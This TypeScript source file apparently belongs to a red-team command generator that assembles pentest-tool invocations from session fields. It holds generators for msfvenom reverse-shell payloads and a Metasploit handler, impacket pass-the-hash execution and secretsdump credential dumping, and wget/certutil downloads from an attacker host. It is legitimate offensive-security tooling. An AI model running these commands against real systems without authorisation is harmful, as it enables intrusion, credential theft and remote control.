export interface RedSession {
  target: string;
  userpass: string; // raw "user:pass" input
  domain: string;
  hash: string;
  lhost: string;
  lport: string;
  payload: string;
  filename: string; // used by file module
}

export const DEFAULT_SESSION: RedSession = {
  target: '',
  userpass: '',
  domain: '',
  hash: '',
  lhost: '',
  lport: '4444',
  payload: 'windows/meterpreter/reverse_tcp',
  filename: '',
};

// ── Derived getters ──────────────────────────────────────────────────────────

export function getUser(s: RedSession): string {
  const idx = s.userpass.indexOf(':');
  return idx > -1 ? s.userpass.substring(0, idx) : s.userpass;
}

export function getPassword(s: RedSession): string {
  const idx = s.userpass.indexOf(':');
  return idx > -1 ? s.userpass.substring(idx + 1) : '';
}

export function getUrl(s: RedSession): string {
  const t = s.target.trim();
  if (!t) return '';
  if (t.startsWith('http://') || t.startsWith('https://')) return t;
  return `http://${t}`;
}

export function getDomain(s: RedSession): string {
  const d = s.domain.trim();
  if (d) return d;
  // Try to extract from target if it looks like a domain
  const t = s.target.trim();
  if (t && !t.match(/^\d+\.\d+\.\d+\.\d+$/) && !t.startsWith('http')) return t;
  return '';
}

// ── Payload helpers ──────────────────────────────────────────────────────────

function resolvePayloadFormat(payload: string): string {
  const p = payload.toLowerCase();
  if (p.includes('windows')) return 'exe';
  if (p.includes('linux')) return 'elf';
  if (p.includes('osx') || p.includes('macho')) return 'macho';
  if (p.includes('powershell') || p.includes('psh')) return 'ps1';
  if (p.includes('war')) return 'war';
  if (p.includes('python')) return 'py';
  return 'raw';
}

function resolvePayloadFile(payload: string, fmt: string): string {
  const extMap: Record<string, string> = { exe: 'exe', elf: 'elf', macho: 'macho', raw: 'bin', ps1: 'ps1', war: 'war', py: 'py' };
  const name = payload.split('/').pop()!.replace(/_/g, '-');
  return `${name}.${extMap[fmt] ?? fmt}`;
}

// ── Auth string builders ─────────────────────────────────────────────────────

function ph(val: string, name: string): string {
  return val.trim() || `<${name.toUpperCase()}>`;
}

function buildUPFlags(s: RedSession): string {
  const u = getUser(s);
  const p = getPassword(s);
  const parts: string[] = [];
  if (u) parts.push(`-u '${u}'`);
  if (p) parts.push(`-p '${p}'`);
  return parts.join(' ');
}

function buildImpacketArgs(s: RedSession): string {
  const u = getUser(s);
  const p = getPassword(s);
  const d = getDomain(s);
  const t = s.target.trim() || '<TARGET>';
  const principal = d ? `${d}/${u || '<USER>'}` : (u || '<USER>');
  if (s.hash.trim()) {
    return `-hashes :${s.hash.trim()} '${principal}@${t}'`;
  }
  if (p) return `'${principal}:${p}@${t}'`;
  return `'${principal}@${t}'`;
}

function buildRDPFlags(s: RedSession): string {
  const u = getUser(s);
  const p = getPassword(s);
  const parts: string[] = [];
  if (u) parts.push(`/u:'${u}'`);
  if (p) parts.push(`/p:'${p}'`);
  return parts.join(' ');
}

function buildFlagU(s: RedSession): string {
  const u = getUser(s);
  const p = getPassword(s);
  if (u && p) return `-U '${u}%${p}'`;
  return '-N';
}

// ── Wordlist defaults (matching RedSploit config.yaml) ───────────────────────

const WL_DIR = '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt';
const WL_SUB = '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt';
const WL_VHOST = '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt';

// ── Tool definitions ─────────────────────────────────────────────────────────

export interface ToolDef {
  id: string;
  label: string;
  desc: string;
  category: string;
  requires?: string[]; // 'target' | 'domain' | 'url' | 'auth' | 'lhost' | 'filename'
  gen: (s: RedSession) => string;
}

export interface ModuleDef {
  id: string;
  label: string;
  tools: ToolDef[];
}

export const MODULES: ModuleDef[] = [
  {
    id: 'infra',
    label: 'Infra',
    tools: [
      {
        id: 'nmap',
        label: 'nmap',
        desc: 'Service/version scan with default scripts',
        category: 'Scanners',
        requires: ['target'],
        gen: (s) => `nmap -sV -sC -Pn -v ${ph(s.target, 'target')}`,
      },
      {
        id: 'rustscan',
        label: 'rustscan',
        desc: 'Fast port scanner',
        category: 'Scanners',
        requires: ['target'],
        gen: (s) => `rustscan -a ${ph(s.target, 'target')} --ulimit 5000`,
      },
      {
        id: 'smbclient',
        label: 'smbclient',
        desc: 'List SMB shares',
        category: 'SMB Tools',
        requires: ['target'],
        gen: (s) => `smbclient -L //${ph(s.target, 'target')}/ ${buildFlagU(s)}`,
      },
      {
        id: 'smbmap',
        label: 'smbmap',
        desc: 'Enumerate SMB shares and permissions',
        category: 'SMB Tools',
        requires: ['target'],
        gen: (s) => {
          const auth = buildUPFlags(s);
          return `smbmap -H ${ph(s.target, 'target')}${auth ? ' ' + auth : ''} --no-banner -q`;
        },
      },
      {
        id: 'enum4linux',
        label: 'enum4linux',
        desc: 'SMB/NetBIOS enumeration',
        category: 'SMB Tools',
        requires: ['target'],
        gen: (s) => {
          const auth = buildUPFlags(s);
          return `enum4linux-ng -A${auth ? ' ' + auth : ''} ${ph(s.target, 'target')}`;
        },
      },
      {
        id: 'ftp',
        label: 'ftp (lftp)',
        desc: 'FTP client session',
        category: 'Remote Access',
        requires: ['target'],
        gen: (s) => {
          const u = getUser(s) || 'anonymous';
          const p = getPassword(s) || 'anonymous';
          return `lftp -u '${u},${p}' ftp://${ph(s.target, 'target')}`;
        },
      },
      {
        id: 'ssh',
        label: 'ssh',
        desc: 'SSH login with password',
        category: 'Remote Access',
        requires: ['target', 'auth'],
        gen: (s) => {
          const u = getUser(s) || '<USER>';
          const p = getPassword(s) || '<PASS>';
          return `sshpass -p '${p}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${u}@${ph(s.target, 'target')}`;
        },
      },
      {
        id: 'rdp',
        label: 'rdp (xfreerdp)',
        desc: 'Remote desktop connection',
        category: 'Remote Access',
        requires: ['target'],
        gen: (s) => {
          const auth = buildRDPFlags(s);
          return `xfreerdp3 /v:${ph(s.target, 'target')} +clipboard /dynamic-resolution /drive:share,.${auth ? ' ' + auth : ''}`;
        },
      },
      {
        id: 'msf',
        label: 'msf handler',
        desc: 'Metasploit reverse shell handler',
        category: 'Exploitation',
        requires: ['lhost'],
        gen: (s) => {
          const lh = ph(s.lhost, 'lhost');
          const lp = s.lport || '4444';
          const pay = s.payload || 'windows/meterpreter/reverse_tcp';
          return `msfconsole -q -x "use exploit/multi/handler; set payload ${pay}; set LHOST ${lh}; set LPORT ${lp}; set ExitOnSession false; exploit -j"`;
        },
      },
      {
        id: 'msfvenom',
        label: 'msfvenom',
        desc: 'Generate a Metasploit payload',
        category: 'Exploitation',
        requires: ['lhost'],
        gen: (s) => {
          const lh = ph(s.lhost, 'lhost');
          const lp = s.lport || '4444';
          const pay = s.payload || 'windows/meterpreter/reverse_tcp';
          const fmt = resolvePayloadFormat(pay);
          const file = resolvePayloadFile(pay, fmt);
          return `msfvenom -p ${pay} LHOST=${lh} LPORT=${lp} -f ${fmt} -o ${file}`;
        },
      },
    ],
  },
  {
    id: 'ad',
    label: 'AD',
    tools: [
      {
        id: 'nxc',
        label: 'nxc',
        desc: 'SMB credential testing (NetExec)',
        category: 'Enumeration',
        requires: ['target', 'auth'],
        gen: (s) => {
          const auth = buildUPFlags(s);
          return `nxc smb ${ph(s.target, 'target')}${auth ? ' ' + auth : ''}`;
        },
      },
      {
        id: 'bloodhound',
        label: 'bloodhound',
        desc: 'Active Directory graph collection',
        category: 'Enumeration',
        requires: ['target', 'domain', 'auth'],
        gen: (s) => {
          const auth = buildUPFlags(s);
          const d = ph(getDomain(s), 'domain');
          const t = ph(s.target, 'target');
          return `bloodhound-ce-python${auth ? ' ' + auth : ''} -ns ${t} -d ${d} -c all`;
        },
      },
      {
        id: 'kerbrute',
        label: 'kerbrute',
        desc: 'Kerberos username enumeration',
        category: 'Enumeration',
        requires: ['target', 'domain'],
        gen: (s) => `kerbrute userenum --dc ${ph(s.target, 'target')} -d ${ph(getDomain(s), 'domain')} users.txt`,
      },
      {
        id: 'evil_winrm',
        label: 'evil-winrm',
        desc: 'WinRM shell access',
        category: 'Access',
        requires: ['target'],
        gen: (s) => {
          const auth = buildUPFlags(s);
          return `evil-winrm-py -i ${ph(s.target, 'target')}${auth ? ' ' + auth : ''}`;
        },
      },
      {
        id: 'psexec',
        label: 'psexec',
        desc: 'Impacket remote execution via SMB',
        category: 'Execution',
        requires: ['target'],
        gen: (s) => `impacket-psexec ${buildImpacketArgs(s)}`,
      },
      {
        id: 'wmiexec',
        label: 'wmiexec',
        desc: 'Impacket remote execution via WMI',
        category: 'Execution',
        requires: ['target'],
        gen: (s) => `impacket-wmiexec ${buildImpacketArgs(s)}`,
      },
      {
        id: 'secretsdump',
        label: 'secretsdump',
        desc: 'Dump secrets via Impacket',
        category: 'Extraction',
        requires: ['target'],
        gen: (s) => `impacket-secretsdump ${buildImpacketArgs(s)}`,
      },
    ],
  },
  {
    id: 'web',
    label: 'Web',
    tools: [
      {
        id: 'headerscan',
        label: 'headerscan',
        desc: 'Scan HTTP security headers (shcheck.py)',
        category: 'Analysis',
        requires: ['url'],
        gen: (s) => `shcheck.py ${ph(getUrl(s), 'url')}`,
      },
      {
        id: 'waf',
        label: 'wafw00f',
        desc: 'Web application firewall detection',
        category: 'Analysis',
        requires: ['url'],
        gen: (s) => `wafw00f ${ph(getUrl(s), 'url')}`,
      },
      {
        id: 'nuclei',
        label: 'nuclei',
        desc: 'Template-based vulnerability scanner',
        category: 'Vulnerability Scanning',
        requires: ['url'],
        gen: (s) => `nuclei -u ${ph(getUrl(s), 'url')}`,
      },
      {
        id: 'wpscan',
        label: 'wpscan',
        desc: 'WordPress vulnerability scanner',
        category: 'Vulnerability Scanning',
        requires: ['url'],
        gen: (s) => `wpscan --url ${ph(getUrl(s), 'url')} --enumerate --api-token $WPSCAN_API`,
      },
      {
        id: 'dir_ffuf',
        label: 'ffuf (dir)',
        desc: 'Directory fuzzing with ffuf',
        category: 'Directory Scanning',
        requires: ['url'],
        gen: (s) => `ffuf -u ${ph(getUrl(s), 'url')}/FUZZ -w ${WL_DIR} -mc 200,301,302,403`,
      },
      {
        id: 'dir_ferox',
        label: 'feroxbuster',
        desc: 'Directory fuzzing with feroxbuster',
        category: 'Directory Scanning',
        requires: ['url'],
        gen: (s) => `feroxbuster -u ${ph(getUrl(s), 'url')}`,
      },
      {
        id: 'dir_dirsearch',
        label: 'dirsearch',
        desc: 'Directory fuzzing with dirsearch',
        category: 'Directory Scanning',
        requires: ['url'],
        gen: (s) => `dirsearch -u ${ph(getUrl(s), 'url')}`,
      },
      {
        id: 'gobuster_dir',
        label: 'gobuster (dir)',
        desc: 'Directory bruteforce with gobuster',
        category: 'Directory Scanning',
        requires: ['url'],
        gen: (s) => `gobuster dir -u ${ph(getUrl(s), 'url')} -w ${WL_DIR}`,
      },
      {
        id: 'subfinder',
        label: 'subfinder',
        desc: 'Passive subdomain discovery',
        category: 'Subdomain Discovery',
        requires: ['domain'],
        gen: (s) => `subfinder -d ${ph(getDomain(s), 'domain')}`,
      },
      {
        id: 'gobuster_dns',
        label: 'gobuster (dns)',
        desc: 'DNS subdomain bruteforce',
        category: 'Subdomain Discovery',
        requires: ['domain'],
        gen: (s) => `gobuster dns -d ${ph(getDomain(s), 'domain')} -w ${WL_SUB}`,
      },
      {
        id: 'dnsrecon',
        label: 'dnsrecon',
        desc: 'DNS enumeration and bruteforce',
        category: 'Subdomain Discovery',
        requires: ['domain'],
        gen: (s) => `dnsrecon -d ${ph(getDomain(s), 'domain')} -t brf -w ${WL_SUB} -f -n 8.8.8.8`,
      },
      {
        id: 'subzy',
        label: 'subzy',
        desc: 'Subdomain takeover check',
        category: 'Subdomain Discovery',
        requires: ['domain'],
        gen: (s) => `subzy run --target ${ph(getDomain(s), 'domain')}`,
      },
      {
        id: 'vhost',
        label: 'ffuf (vhost)',
        desc: 'Virtual host discovery via ffuf',
        category: 'Subdomain Discovery',
        requires: ['url', 'domain'],
        gen: (s) => `ffuf -u ${ph(getUrl(s), 'url')} -H 'Host:FUZZ.${ph(getDomain(s), 'domain')}' -w ${WL_VHOST} -ic`,
      },
      {
        id: 'screenshots',
        label: 'gowitness',
        desc: 'Website screenshot capture',
        category: 'Reconnaissance',
        requires: ['url'],
        gen: (s) => `gowitness scan --single ${ph(getUrl(s), 'url')}`,
      },
    ],
  },
  {
    id: 'file',
    label: 'File',
    tools: [
      {
        id: 'wget',
        label: 'wget',
        desc: 'Download file on target via wget',
        category: 'Download',
        requires: ['lhost', 'filename'],
        gen: (s) => `wget http://${ph(s.lhost, 'lhost')}:${s.lport || '8000'}/${ph(s.filename, 'filename')}`,
      },
      {
        id: 'curl',
        label: 'curl',
        desc: 'Download file on target via curl',
        category: 'Download',
        requires: ['lhost', 'filename'],
        gen: (s) => `curl http://${ph(s.lhost, 'lhost')}:${s.lport || '8000'}/${ph(s.filename, 'filename')} -O`,
      },
      {
        id: 'iwr',
        label: 'iwr (PowerShell)',
        desc: 'Download file on target via Invoke-WebRequest',
        category: 'Download',
        requires: ['lhost', 'filename'],
        gen: (s) => `iwr http://${ph(s.lhost, 'lhost')}:${s.lport || '8000'}/${ph(s.filename, 'filename')} -OutFile ${ph(s.filename, 'filename')}`,
      },
      {
        id: 'certutil',
        label: 'certutil (Windows)',
        desc: 'Download file on target via certutil',
        category: 'Download',
        requires: ['lhost', 'filename'],
        gen: (s) => `certutil -urlcache -split -f http://${ph(s.lhost, 'lhost')}:${s.lport || '8000'}/${ph(s.filename, 'filename')} ${ph(s.filename, 'filename')}`,
      },
      {
        id: 'scp',
        label: 'scp',
        desc: 'Copy file to attacker via scp',
        category: 'Download',
        requires: ['lhost', 'filename'],
        gen: (s) => `scp user@${ph(s.lhost, 'lhost')}:$(pwd)/${ph(s.filename, 'filename')} .`,
      },
      {
        id: 'http_server',
        label: 'HTTP server',
        desc: 'Start a Python HTTP server to serve files',
        category: 'Servers',
        gen: (s) => `python3 -m http.server ${s.lport || '8000'}`,
      },
      {
        id: 'smb_server',
        label: 'SMB server',
        desc: 'Start an Impacket SMB server (serve current dir as "share")',
        category: 'Servers',
        gen: (s) => `impacket-smbserver share . -smb2support`,
      },
      {
        id: 'base64',
        label: 'base64 encode',
        desc: 'Base64-encode a local file for manual transfer',
        category: 'Encoding',
        requires: ['filename'],
        gen: (s) => `base64 ${ph(s.filename, 'filename')}`,
      },
    ],
  },
];

export function groupByCategory(tools: ToolDef[]): Map<string, ToolDef[]> {
  const map = new Map<string, ToolDef[]>();
  for (const t of tools) {
    const group = map.get(t.category) ?? [];
    group.push(t);
    map.set(t.category, group);
  }
  return map;
}

export function getMissingVars(tool: ToolDef, s: RedSession): string[] {
  const missing: string[] = [];
  for (const req of tool.requires ?? []) {
    if (req === 'target' && !s.target.trim()) missing.push('Target');
    if (req === 'domain' && !getDomain(s)) missing.push('Domain');
    if (req === 'url' && !s.target.trim()) missing.push('Target (URL)');
    if (req === 'auth' && !s.userpass.trim()) missing.push('User:Pass');
    if (req === 'lhost' && !s.lhost.trim()) missing.push('LHOST');
    if (req === 'filename' && !s.filename.trim()) missing.push('Filename');
  }
  return missing;
}
